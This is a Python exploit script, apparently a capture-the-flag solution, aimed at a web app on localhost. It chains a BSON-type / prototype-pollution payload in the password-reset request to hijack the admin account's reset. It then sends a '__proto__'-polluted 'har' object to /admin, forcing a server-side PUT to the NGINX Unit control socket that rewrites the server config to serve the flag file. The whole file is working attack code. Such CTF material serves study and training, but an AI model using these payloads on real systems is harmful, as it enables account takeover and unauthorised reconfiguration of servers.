import requests
import json
import sys


def resetpass(emailaddress):
	headers = {'Content-Type': 'application/json'}
	resets = {
		"email": {
			"address" : emailaddress,
			"_bsontype" : "aa"
		},
		"__proto__" : {},
	}
	reset_url = url + "/resetpass"
	requests.post(reset_url, headers = headers, data = json.dumps(resets))

def getflag(passwd):
	sess = requests.session()
	login_data = {
	'email' : "admin@realworldctf.com",
	"password" : passwd
	}
	login_url = url + "/signin"
	logining = sess.post(login_url , data = login_data)
	if 'Hello' not in logining.text:
		print('Wrong password!')
		sys.exit(0)

	attack_unix = {
		"url" : {
			"uri" : "http://unix:/var/run/control.unit.sock:/config/",
			"har" : {
				"method" : "PUT",
				"postData" : {
					"__proto__" : {
						"text" : "{\"listeners\": {\"0.0.0.0:13333\": {\"pass\": \"applications/realworldcms\"}},\"applications\":{\"realworldcms\":{\"type\": \"php\",\"root\": \"/\",\"index\": \"flag\"}}}" ,
					}
				},
			},
		},
		"__proto__" : {}
	}
	headers = {'Content-Type': 'application/json'}

	checkers_url = url + '/admin'
	sess.post(checkers_url, headers = headers, data = json.dumps(attack_unix))

	flag = sess.get(url)
	print(flag.text)



if __name__ == '__main__':
	url = "http://localhost:13333"
	emailaddress = str(input("Plases input the email which you receive:")).strip().strip('\n')
	resetpass(emailaddress)
	password = str(input("Plases input the password  you received:")).strip().strip('\n')
	getflag(password)




